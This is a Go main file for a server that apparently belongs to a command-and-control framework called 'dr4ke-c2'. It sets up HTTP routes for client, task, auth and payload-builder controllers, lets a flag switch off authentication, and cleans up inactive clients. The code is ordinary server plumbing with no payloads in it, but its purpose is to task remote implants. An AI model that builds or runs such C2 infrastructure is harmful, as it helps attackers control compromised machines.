package main

import (
	"context"
	"dr4ke-c2/server/config"
	"dr4ke-c2/server/controllers"
	"dr4ke-c2/server/database"
	"dr4ke-c2/server/routes"
	"dr4ke-c2/server/utils"
	"flag"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
)

var (
	configFile            = flag.String("config", "config.json", "Path to configuration file")
	dbType                = flag.String("db", "", "Database type (memory or bolt)")
	port                  = flag.String("port", "", "Server port")
	clientLimit           = flag.Int("limit", 0, "Maximum number of clients")
	debugMode             = flag.Bool("debug", false, "Enable debug mode")
	autoOptimize          = flag.Bool("auto", false, "Automatically optimize settings based on system resources")
	devMode               = flag.Bool("dev", false, "Enable development mode (disables authentication)")
	serverShutdownTimeout = 15 * time.Second
	readHeaderTimeout     = 5 * time.Second
)

func recoverPanic(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if err := recover(); err != nil {
				utils.LogOutput("[PANIC] Recovered from panic: %v", err)
				utils.LogOutput("[PANIC] Stack trace: %s", utils.GetStackTrace())
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}()
		next.ServeHTTP(w, r)
	})
}
func ensureDirectoriesExist(cfg *config.Configuration) error {
	if cfg.Database.Type == "bolt" {
		dbDir := filepath.Dir(cfg.Database.FilePath)
		if err := os.MkdirAll(dbDir, 0755); err != nil {
			return err
		}
	}
	if cfg.Server.StaticFilesPath != "" {
		staticPath := cfg.Server.StaticFilesPath
		if _, err := os.Stat(staticPath); os.IsNotExist(err) {
			utils.LogOutput("[WARNING] Static files directory does not exist: %s", staticPath)
			parentDir := filepath.Join("..", staticPath)
			if _, err := os.Stat(parentDir); err == nil {
				staticPath = parentDir
				cfg.Server.StaticFilesPath = parentDir
				utils.LogOutput("[INFO] Using static files from parent directory: %s", parentDir)
			}
		}
		subdirs := []string{"html", "css", "js"}
		for _, dir := range subdirs {
			dirPath := filepath.Join(staticPath, dir)
			if err := os.MkdirAll(dirPath, 0755); err != nil {
				utils.LogOutput("[WARNING] Failed to create directory %s: %v", dirPath, err)
			}
		}
	}
	return nil
}

func main() {
	defer func() {
		if err := recover(); err != nil {
			utils.LogOutput("[FATAL] Main goroutine panic: %v", err)
			utils.LogOutput("[FATAL] Stack trace: %s", utils.GetStackTrace())
			os.Exit(1)
		}
	}()
	flag.Parse()
	runtime.GOMAXPROCS(runtime.NumCPU())

	resourceMgr := utils.NewResourceManager(
		1024,
		int64(runtime.NumCPU()*100),
		0.8,
	)
	defer resourceMgr.Close()
	utils.LogOutput("[INFO] Running on %s %s with %d CPUs",
		runtime.GOOS, runtime.GOARCH, runtime.NumCPU())
	cfg := config.LoadConfig(*configFile)
	if cfg == nil {
		utils.LogOutput("[FATAL] Failed to load configuration")
		os.Exit(1)
	}
	if err := applyCommandLineOverrides(cfg); err != nil {
		utils.LogOutput("[FATAL] Failed to apply command line overrides: %v", err)
		os.Exit(1)
	}
	if err := ensureDirectoriesExist(cfg); err != nil {
		utils.LogOutput("[WARNING] %v", err)
	}
	store, err := createOptimizedStore(cfg, resourceMgr)
	if err != nil {
		utils.LogOutput("[FATAL] Failed to create database: %v", err)
		os.Exit(1)
	}
	defer func() {
		if err := store.Close(); err != nil {
			utils.LogOutput("[ERROR] Failed to close database: %v", err)
		}
	}()
	batchProcessor := createBatchProcessor(store, cfg, resourceMgr)
	if batchProcessor != nil {
		defer func() {
			utils.LogOutput("[INFO] Stopping batch processor...")
			batchProcessor.Stop()
		}()
	}
	controllers := initializeControllers(store, batchProcessor, resourceMgr, cfg)

	utils.SetLogCallback(controllers.AddServerLog)

	handler := recoverPanic(routes.SetupRoutes(
		controllers.client,
		controllers.task,
		controllers.auth,
		controllers.builder,
		cfg.Server.StaticFilesPath,
	))

	server := createOptimizedServer(cfg, handler)

	stopCleanup := make(chan struct{})
	go cleanupRoutine(store, stopCleanup, cfg)
	defer close(stopCleanup)

	go func() {
		utils.LogOutput("[INFO] HTTP server running on http://%s:%s with client limit: %d",
			cfg.Server.Host, cfg.Server.Port, cfg.Server.ClientLimit)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			utils.LogOutput("[FATAL] Failed to start HTTP server: %v", err)
			os.Exit(1)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit
	utils.LogOutput("[INFO] Server shutting down...")

	ctx, cancel := context.WithTimeout(context.Background(), serverShutdownTimeout)
	defer cancel()

	if err := server.Shutdown(ctx); err != nil {
		utils.LogOutput("[ERROR] HTTP server shutdown failed: %v", err)
		os.Exit(1)
	}
	utils.LogOutput("[INFO] Server stopped")
}

type Controllers struct {
	client  *controllers.ClientController
	task    *controllers.TaskController
	auth    *controllers.AuthController
	builder *controllers.BuilderController
}

func (c *Controllers) AddServerLog(level, message string) {
	controllers.AddServerLog(level, message)
}

func initializeControllers(store database.Store, batchProcessor *database.BatchProcessor, resourceMgr *utils.ResourceManager, cfg *config.Configuration) *Controllers {
	clientController := controllers.NewClientController(store)
	if batchProcessor != nil {
		if err := clientController.SetBatchProcessor(batchProcessor); err != nil {
			utils.LogOutput("[WARNING] Failed to set batch processor: %v", err)
		}
	}
	return &Controllers{
		client:  clientController,
		task:    controllers.NewTaskController(store),
		auth:    controllers.NewAuthController(cfg.Server.ServerKey, store),
		builder: controllers.NewBuilderController(cfg.Server.ServerKey),
	}
}
func applyCommandLineOverrides(cfg *config.Configuration) error {
	if *dbType != "" {
		cfg.Database.Type = *dbType
	}
	if *port != "" {
		cfg.Server.Port = *port
	}
	if *devMode {
		os.Setenv("DR4KE_DEV_MODE", "true")
		utils.LogOutput("[INFO] Running in development mode - authentication disabled")
	}
	if *autoOptimize {
		utils.LogOutput("[INFO] Auto-optimizing server settings based on system resources...")
		optBatchSize, optClientLimit, optQueueSize, err := utils.GetOptimalServerConfigs()
		if err != nil {
			utils.LogOutput("[WARNING] Failed to get optimal configurations: %v, using defaults", err)
		} else {
			if *clientLimit == 0 {
				cfg.Server.ClientLimit = optClientLimit
				utils.LogOutput("[INFO] Auto-configured client limit: %d", optClientLimit)
			}
			cfg.Batch.MaxBatchSize = optBatchSize
			cfg.Batch.QueueSize = optQueueSize
			utils.LogOutput("[INFO] Auto-configured batch size: %d, queue size: %d",
				optBatchSize, optQueueSize)
		}
	} else if *clientLimit > 0 {
		cfg.Server.ClientLimit = *clientLimit
	}
	if *debugMode {
		cfg.Advanced.EnableProfiling = true
	}
	return config.SaveConfig(*configFile)
}
func createOptimizedStore(cfg *config.Configuration, resourceMgr *utils.ResourceManager) (database.Store, error) {
	var store database.Store
	var err error
	switch cfg.Database.Type {
	case "memory":
		store = database.NewMemoryStore(cfg.Server.ClientLimit, resourceMgr)
	case "bolt":
		store, err = database.NewBoltStore(cfg.Database.FilePath, cfg.Server.ClientLimit)
	default:
		return nil, err
	}
	if err != nil {
		return nil, err
	}
	utils.LogOutput("[INFO] Using %s database with client limit: %d", cfg.Database.Type, cfg.Server.ClientLimit)
	return store, nil
}
func createBatchProcessor(store database.Store, cfg *config.Configuration, resourceMgr *utils.ResourceManager) *database.BatchProcessor {
	if !cfg.Batch.Enabled {
		utils.LogOutput("[INFO] Batch processing disabled")
		return nil
	}
	flushInterval := cfg.GetBatchFlushInterval()
	maxBatchSize := cfg.Batch.MaxBatchSize
	utils.LogOutput("[INFO] Creating batch processor: flushInterval=%v, maxBatchSize=%d, queueSize=%d",
		flushInterval, maxBatchSize, cfg.Batch.QueueSize)
	return database.NewBatchProcessor(store, flushInterval, maxBatchSize, resourceMgr)
}

func createOptimizedServer(cfg *config.Configuration, handler http.Handler) *http.Server {
	return &http.Server{
		Addr:              cfg.Server.Host + ":" + cfg.Server.Port,
		Handler:           handler,
		ReadTimeout:       10 * time.Second,
		WriteTimeout:      10 * time.Second,
		IdleTimeout:       120 * time.Second,
		ReadHeaderTimeout: readHeaderTimeout,
	}
}

func cleanupRoutine(store database.Store, stop <-chan struct{}, cfg *config.Configuration) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			if _, err := store.CleanupInactiveClients(30 * time.Minute); err != nil {
				utils.LogOutput("[ERROR] Failed to cleanup inactive clients: %v", err)
			}
		case <-stop:
			return
		}
	}
}
func logStaticPathInfo(staticPath string) {
	absPath, err := filepath.Abs(staticPath)
	if err != nil {
		utils.LogOutput("[WARNING] Failed to get absolute path for static files: %v", err)
		return
	}
	utils.LogOutput("[INFO] Serving static files from: %s (absolute: %s)", staticPath, absPath)
	info, err := os.Stat(staticPath)
	if err != nil {
		if os.IsNotExist(err) {
			utils.LogOutput("[ERROR] Static directory does not exist: %s", staticPath)
		} else {
			utils.LogOutput("[WARNING] Failed to check static directory: %v", err)
		}
		return
	}
	if !info.IsDir() {
		utils.LogOutput("[ERROR] Static path is not a directory: %s", staticPath)
		return
	}
	files, err := os.ReadDir(staticPath)
	if err != nil {
		utils.LogOutput("[WARNING] Failed to read static directory: %v", err)
		return
	}
	if len(files) == 0 {
		utils.LogOutput("[WARNING] Static directory is empty")
		return
	}
	utils.LogOutput("[INFO] Files in static directory:")
	for _, file := range files {
		info, err := file.Info()
		if err == nil {
			utils.LogOutput("  - %s (%d bytes)", file.Name(), info.Size())
		} else {
			utils.LogOutput("  - %s", file.Name())
		}
	}
}
